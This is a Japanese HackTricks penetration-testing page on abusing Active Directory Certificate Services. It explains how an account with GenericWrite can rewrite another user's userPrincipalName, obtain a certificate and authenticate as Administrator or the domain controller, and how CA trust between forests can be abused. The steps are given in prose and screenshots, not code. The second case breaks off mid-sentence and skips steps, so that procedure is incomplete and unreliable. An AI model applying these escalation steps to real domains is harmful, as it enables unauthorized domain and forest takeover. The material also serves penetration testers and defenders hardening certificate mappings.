### 悪用方法 ケース1

* `StrongCertificateBindingEnforcement`が`0`に設定されている
* `GenericWrite`を使用して任意のアカウントAを侵害し、任意のアカウントBを侵害する

この場合、`John@corp.local`は`Jane@corp.local`に対して`GenericWrite`を持っており、`Administrator@corp.local`を侵害したいとします。悪用手順はESC9とほぼ同じですが、任意の証明書テンプレートを使用できます。

まず、`Jane`のハッシュを取得します。たとえば、Shadow Credentialsを使用して行います（`GenericWrite`を使用）。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

次に、`Jane`の`userPrincipalName`を`Administrator`に変更します。`@corp.local`の部分は省略していることに注意してください。

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

これは制約違反ではありません。なぜなら、`Administrator`ユーザーの`userPrincipalName`は`Administrator@corp.local`ではなく`Administrator`だからです。

次に、クライアント認証を許可する任意の証明書をリクエストします。たとえば、デフォルトの`User`テンプレートを使用できます。証明書は`Jane`としてリクエストする必要があります。

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

証明書の`userPrincipalName`が`Administrator`であることに注意してください。

その後、`Jane`の`userPrincipalName`を元の`Jane@corp.local`など別のものに戻します。

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

これで、証明書で認証しようとすると、`Administrator@corp.local`ユーザーのNTハッシュが受け取れます。証明書にドメインが指定されていないため、コマンドラインに`-domain <domain>`を追加する必要があります。

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### 悪用方法 ケース2

* `CertificateMappingMethods`に`UPN`ビットフラグ（`0x4`）が含まれている
* `GenericWrite`を使用して`userPrincipalName`プロパティを持たない任意のアカウントAを侵害し、マシンアカウントおよび組み込みドメイン管理者`Administrator`を侵害する

この場合、`John@corp.local`は`Jane@corp.local`に対して`GenericWrite`を持っており、ドメインコントローラ`DC$@corp.local`を侵害したいとします。

まず、`Jane`の
次に、`Jane`の`userPrincipalName`を元の`userPrincipalName`（`Jane@corp.local`）に戻します。

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

さて、このレジストリキーはSchannelに適用されるため、Schannelを介した認証には証明書を使用する必要があります。これは、Certipyの新しい`-ldap-shell`オプションが役立ちます。

証明書と`-ldap-shell`を使用して認証を試みると、サーバーから`u:CORP\DC$`という文字列で認証されていることがわかります。

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

LDAPシェルの利用可能なコマンドの1つは、ターゲットにリソースベースの制約委任（RBCD）を設定する`set_rbcd`です。したがって、RBCD攻撃を実行してドメインコントローラーを侵害することができます。

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

また、`userPrincipalName`が設定されていないユーザーアカウントや、`userPrincipalName`がそのアカウントの`sAMAccountName`と一致しない場合にも、任意のユーザーアカウントを侵害することができます。私自身のテストでは、デフォルトのドメイン管理者である`Administrator@corp.local`はデフォルトでは`userPrincipalName`が設定されていないため、このアカウントは通常、ドメインコントローラーよりもLDAPでより多くの特権を持つはずです。

## 証明書を使用したフォレストの侵害

### CAの信頼関係によるフォレストの侵害

**クロスフォレストの登録**のセットアップは比較的簡単です。管理者は、リソースフォレストの**ルートCA証明書**を**アカウントフォレストに公開**し、リソースフォレストの**エンタープライズCA証明書**を各アカウントフォレストの**`NTAuthCertificates`**およびAIAコンテナに追加します。はっきり言って、これはリソースフォレストの**CAが管理する他のすべてのフォレストに完全な制御権を持つ**ことを意味します。攻撃者がこのCAを**侵害すると、リソースフォレストとアカウントフォレストのすべてのユーザーの証明書を偽造**することができ、フォレストのセキュリティ境界を破ることができます。

### 登録権限を持つ外部プリンシパル

マルチフォレスト環境では、Enterprise CAが**認証ユーザーまたは外部プリンシパル**（Enterprise CAが所属するフォレスト外のユーザー/グループ）に**登録および編集権限**を付与する**証明書テンプレートを公開**することに注意する必要があります。\
アカウントが**信頼を介して認証すると、ADは認証ユーザーのSID**を認証ユーザーのトークンに追加します。したがって、エンタープライズCAが**認証ユーザーに登録権限を付与するテンプレート**を持つドメインがある場合、異なるフォレストのユーザーは**そのテンプレートに登録**する可能性があります。同様に、テンプレートが**外部プリンシパルに明示的に登録権限を付与**する場合、**クロスフォレストのアクセス制御関係が作成**され、1つのフォレストのプリンシパルが他のフォレストのテンプレートに**登録**することが許可されます。

結局のところ、これらのシナリオのいずれかでは、1つのフォレストから別のフォレストへの攻撃面が増加します。証明書テンプレートの設定によっては、攻撃者はこれを悪用して外部ドメインで追加の特権を取得する可能性があります。

## 参考文献

* このページのすべての情報は、[https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)から取得されました。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見してください。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**を**フォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
